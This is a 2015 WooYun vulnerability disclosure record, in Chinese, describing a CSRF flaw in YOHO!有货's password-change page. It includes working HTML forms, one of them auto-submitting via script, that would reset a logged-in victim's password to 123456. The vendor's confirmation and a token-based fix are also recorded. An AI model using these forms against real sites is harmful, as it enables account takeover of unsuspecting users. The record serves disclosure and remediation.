{"id": 38050, "wybug_id": "wooyun-2015-098312", "wybug_title": "YOHO CSRF重置用户密码漏洞（需要用户交互）", "wybug_corp": "YOHO!有货", "wybug_author": "浅蓝", "wybug_date": "2015-02-25 19:03", "wybug_open_date": "2015-04-13 16:58", "wybug_type": "CSRF", "wybug_level": "低", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向公众公开  简要描述： 如题 详细说明：  http://www.yohobuy.com/home/userpwd 登陆后在此处需要先输入登陆密码 然后到下一步下一步只有新密码和重复密码在第二步提交的时候抓包\nhttp://www.yohobuy.com/home/userpwd/modpwdpassword=123456&confirm_password=123456&code=s5po\n没有token之类的参数 也没有referer防御构造如下表单\n<form id=\"sb\" action=\"http://www.yohobuy.com/home/userpwd/modpwd\" method=\"post\">\t\t<input type=text name=password value=\"123456\">\t\t<input type=text name=confirm_password value=\"123456\">\t\t<input type=text name=code value=\"s5po\">\t\t<script>        document.getElementById('sb').submit();    </script>\t</form>\n经过多次测试   验证码只要是生成过的，提交就可以通过验证就算不行 还可以这样\n<form action=\"http://www.yohobuy.com/home/userpwd/modpwd\" method=\"post\">\t\t<input type=hidden name=password value=\"123456\">\t\t<input type=hidden name=confirm_password value=\"123456\"><img src=\"http://www.yohobuy.com/home/account/code?g=email_auth&time=1424860578152\">\t\t<input type=text name=code value=\"\">\t<input type=submit>\t</form>\n\n\n   漏洞证明：  \n\n   修复方案：  token   版权声明：转载请注明来源 浅蓝@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-02-26 09:41 厂商回复： 感谢@浅蓝 ,我们马上修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}